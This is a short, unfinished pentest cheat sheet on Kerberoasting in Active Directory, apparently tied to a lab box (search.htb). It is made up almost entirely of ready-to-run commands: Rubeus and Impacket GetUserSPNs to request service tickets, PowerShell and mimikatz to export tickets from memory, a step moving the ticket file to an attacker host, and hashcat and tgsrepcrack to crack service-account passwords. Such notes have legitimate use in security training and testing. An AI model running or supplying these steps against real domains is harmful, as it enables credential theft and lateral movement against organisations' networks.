# Kerberoasting

#### STILL EDITING

#### Kerberoasting

> **Kerberoasting** allows a user to request a service ticket for any service with a registered **SPN** then use that ticket to crack the service password.

* **Rubeus** (local):

```powershell
.\Rubeus.exe kerberoast
```

* **Impacket** (remote):

```bash
GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request
```

```bash
GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp -outputfile web_svc.hash
```

* Cracking Kerberos 5 etype 23 TGS-REP:

```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

```bash
hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt 
```

### Service Tickets

Add System.IdenityModel namespace:

```powershell
Add-Type -AssemblyName System.IdentityModel
```

Request the service ticket:

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN'
```

Display all cached service tickets

```powershell
klist
```

Now with the service ticket of the IIS SPN created and saved to memory we can download it from memory with mimikatz:

```
kerberos::list /export
```

This creates file ending with `.kirbi` on disk. According to the Kerberos protocol service ticket is encrypted using the SPN password hash. We can transfer this `.kirbi` file to out attacker host.

If we can perform Kerberoasting we can get the password hash of the SPN and from that we can crack the plaintext password of the service account.

Let's install kerberoast:

```
sudo apt install kerberoast
```

Now with the kerberoast package installed we can run `tgsrepcrack.py` to crack the password of the service account:

```shell
python tgsrepcrack.py wordlist.txt filename.kirbi
```
